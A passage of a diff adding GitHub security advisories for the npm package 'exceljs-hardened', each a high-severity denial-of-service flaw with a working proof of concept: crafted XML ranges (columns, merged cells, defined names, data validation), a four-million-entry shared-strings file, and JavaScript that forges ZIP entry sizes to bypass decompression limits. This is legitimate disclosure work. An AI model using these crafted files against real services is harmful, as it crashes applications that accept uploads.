+      "description": "### Summary\r\n\r\nThe streaming reader (`stream.xlsx.WorkbookReader`) applies no limit to the size of what it decompresses. A small crafted archive makes it consume unbounded memory, CPU or disk.\r\n\r\n\r\n### Details\r\n\r\nThe limits available when loading a workbook with `xlsx.load()` are not applied by the streaming reader.\r\n\r\nTwo paths grow with the input:\r\n\r\n- With `sharedStrings: 'cache'`, every string is kept in memory.\r\n- Worksheets stored before `xl/sharedStrings.xml` are first copied to temporary files, whatever their size.\r\n\r\n\r\n### Proof of concept\r\n\r\nReplace `xl/sharedStrings.xml` of a valid workbook with four million entries. The file stays around 170 KB once compressed:\r\n\r\n```js\r\nconst sst =\r\n  '<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">' +\r\n  '<si><t>a</t></si>'.repeat(4_000_000) +\r\n  '</sst>';\r\n```\r\n\r\n```js\r\nconst reader = new ExcelJS.stream.xlsx.WorkbookReader('crafted.xlsx', { sharedStrings: 'cache' });\r\nfor await (const ws of reader) {\r\n  for await (const row of ws) { /* ... */ }\r\n}\r\n```\r\n\r\nMemory grows linearly with the number of entries: 245 MB of RSS for 4 million, against 152 MB with `sharedStrings: 'ignore'`. Larger archives scale accordingly.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service through memory exhaustion, or through a full temporary directory, in applications that read untrusted uploads with the streaming reader.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-4x86-rw7g-whwg",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:02:25Z",
+      "published_at": "2026-10-16T16:02:25Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-qvh4-wwpm-ggc8",
+      "cve_id": "CVE-2026-128340",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-qvh4-wwpm-ggc8",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-qvh4-wwpm-ggc8",
+      "summary": "Process crash through an oversized defined name range",
+      "description": "### Summary\r\n\r\nA workbook of a few KB with a defined name covering a whole sheet aborts the Node.js process with an out-of-memory error when loaded.\r\n\r\n\r\n### Details\r\n\r\nCell ranges of defined names are expanded cell by cell into a matrix when the workbook is loaded.\r\n\r\n`$A$1:$XFD$1048576` covers about 17 billion cells, far beyond available memory.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/workbook.xml` of any valid workbook that contains a sheet named `S`, add inside `<definedNames>`:\r\n\r\n```xml\r\n<definedName name=\"x\">S!$A$1:$XFD$1048576</definedName>\r\n```\r\n\r\n```js\r\nawait new ExcelJS.Workbook().xlsx.load(buffer);\r\n// FATAL ERROR: ... JavaScript heap out of memory   (node --max-old-space-size=512)\r\n```\r\n\r\nThe file is about 6 KB.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service. The abort is a fatal V8 error, not an exception: it cannot be handled with `try/catch` and takes down the whole process.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-qvh4-wwpm-ggc8",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128340",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:50:59Z",
+      "published_at": "2026-10-16T16:02:02Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-f689-fh93-2pm2",
+      "cve_id": "CVE-2026-128341",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-f689-fh93-2pm2",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-f689-fh93-2pm2",
+      "summary": "Event loop blocking and memory exhaustion through an oversized data validation range",
+      "description": "### Summary\r\n\r\nA workbook of a few KB with a very large data validation range blocks the event loop and then exhausts memory when loaded.\r\n\r\n\r\n### Details\r\n\r\nEach address of a `sqref` range is stored individually in the validation model.\r\n\r\n`A1:XFD1048576` expands to about 17 billion entries, so the load never completes and ends in an out-of-memory abort.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/worksheets/sheet1.xml` of any valid workbook:\r\n\r\n```xml\r\n<dataValidations count=\"1\">\r\n  <dataValidation type=\"list\" sqref=\"A1:XFD1048576\"><formula1>\"a,b\"</formula1></dataValidation>\r\n</dataValidations>\r\n```\r\n\r\n```js\r\nawait new ExcelJS.Workbook().xlsx.load(buffer);\r\n// event loop blocked, then: FATAL ERROR: ... JavaScript heap out of memory\r\n```\r\n\r\nThe file is about 6 KB.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service. While the load runs, the process serves no other request. It ends in a fatal V8 abort that cannot be handled with `try/catch`.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-f689-fh93-2pm2",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128341",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:52:17Z",
+      "published_at": "2026-10-16T16:01:20Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-407",
+          "name": "Inefficient Algorithmic Complexity"
+        },
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-407",
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-w57r-3mm6-w6g7",
+      "cve_id": "CVE-2026-128338",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-w57r-3mm6-w6g7",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-w57r-3mm6-w6g7",
+      "summary": "Process crash through an oversized column range",
+      "description": "### Summary\r\n\r\nA workbook of a few KB with a huge `<col>` range aborts the Node.js process with an out-of-memory error when loaded.\r\n\r\n\r\n### Details\r\n\r\nFor each `<col min max>` read from the file, one `Column` object is created for every column index in the range.\r\n\r\nThe upper bound is not limited to the 16,384 columns that Excel supports, so `max=\"300000000\"` allocates 300 million objects.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/worksheets/sheet1.xml` of any valid workbook:\r\n\r\n```xml\r\n<cols><col min=\"1\" max=\"300000000\" width=\"10\" customWidth=\"1\"/></cols>\r\n```\r\n\r\n```js\r\nawait new ExcelJS.Workbook().xlsx.load(buffer);\r\n// FATAL ERROR: ... JavaScript heap out of memory\r\n```\r\n\r\nThe file is about 6 KB. The process aborts in a few seconds.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service. The abort is a fatal V8 error, not an exception: it cannot be handled with `try/catch` and takes down the whole process.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-w57r-3mm6-w6g7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128338",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:49:40Z",
+      "published_at": "2026-10-16T16:01:10Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-wh3v-83h4-rwwq",
+      "cve_id": "CVE-2026-128339",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-wh3v-83h4-rwwq",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-wh3v-83h4-rwwq",
+      "summary": "Process crash through an oversized merged cell range",
+      "description": "### Summary\r\n\r\nA workbook of a few KB with a very large merged range aborts the Node.js process with an out-of-memory error when loaded.\r\n\r\n\r\n### Details\r\n\r\nMerged ranges read from the file are expanded cell by cell into worksheet cells.\r\n\r\n`A1:XFD1048576` is a valid range for Excel, and it covers about 17 billion cells. Memory is exhausted long before the expansion ends, and V8 aborts the process.\r\n\r\n\r\n### Proof of concept\r\n\r\nIn `xl/worksheets/sheet1.xml` of any valid workbook:\r\n\r\n```xml\r\n<mergeCells count=\"1\"><mergeCell ref=\"A1:XFD1048576\"/></mergeCells>\r\n```\r\n\r\n```js\r\nawait new ExcelJS.Workbook().xlsx.load(buffer);\r\n// FATAL ERROR: ... JavaScript heap out of memory\r\n```\r\n\r\nThe file is about 6 KB. The process aborts in a few seconds.\r\n\r\n\r\n### Impact\r\n\r\nDenial of service. The abort is a fatal V8 error, not an exception: it cannot be handled with `try/catch` and takes down the whole process, including every other request it serves.\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-wh3v-83h4-rwwq",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128339",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:50:05Z",
+      "published_at": "2026-10-16T16:00:57Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-770"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-vpg5-x5h5-cw7m",
+      "cve_id": null,
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-vpg5-x5h5-cw7m",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-vpg5-x5h5-cw7m",
+      "summary": "Decompression limit bypass through forged ZIP entry sizes",
+      "description": "### Summary\r\n\r\nThe decompression limits applied by `xlsx.load()` can be bypassed with a crafted archive. A few hundred KB of input makes the process inflate hundreds of MB, or more, regardless of the configured limits.\r\n\r\n### Details\r\n\r\nThe size check reads the uncompressed size declared in the ZIP central directory, a value the attacker controls.\r\n\r\nThe archive is then fully inflated into memory. Only afterwards does JSZip compare the real size with the declared one and fail with `uncompressed data size mismatch`, which is too late.\r\n\r\n### Proof of concept\r\n\r\nBuild a ZIP whose entry `xl/media/image1.png` really inflates to 300 MB of zeros, then overwrite the uncompressed-size field of its central directory header with `10`:\r\n\r\n```js\r\nconst zip = await JSZip.loadAsync(await validWorkbookBuffer);\r\nzip.file('xl/media/image1.png', Buffer.alloc(300 * 1024 * 1024), { compression: 'DEFLATE' });\r\nconst buf = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });\r\n\r\nfor (let i = 0; i < buf.length - 46; i++) {\r\n  if (buf.readUInt32LE(i) === 0x02014b50) {            // central directory header\r\n    const n = buf.readUInt16LE(i + 28);\r\n    if (buf.toString('utf8', i + 46, i + 46 + n) === 'xl/media/image1.png') {\r\n      buf.writeUInt32LE(10, i + 24);                   // declared size\r\n    }\r\n  }\r\n}\r\n\r\nawait new ExcelJS.Workbook().xlsx.load(buf);\r\n```\r\n\r\nThe archive is about 312 KB. The default limits (128 MiB per entry, 512 MiB in total) are not enforced, and the process inflates the full 300 MB before failing.\r\n\r\n### Impact\r\n\r\nMemory exhaustion of the process that loads the file. An out-of-memory abort cannot be caught by the application.",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-vpg5-x5h5-cw7m",
+          "type": "GHSA"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-10-16T16:00:41Z",
+      "published_at": "2026-10-16T16:00:41Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-409",
+          "name": "Improper Handling of Highly Compressed Data (Data Amplification)"
+        },
+        {
+          "cwe_id": "CWE-807",
+          "name": "Reliance on Untrusted Inputs in a Security Decision"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-409",
+        "CWE-807"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-pwgq-2cgg-6ph9",
+      "cve_id": "CVE-2026-128336",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-pwgq-2cgg-6ph9",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-pwgq-2cgg-6ph9",
+      "summary": "Prototype pollution through a defined name on a sheet named `__proto__`",
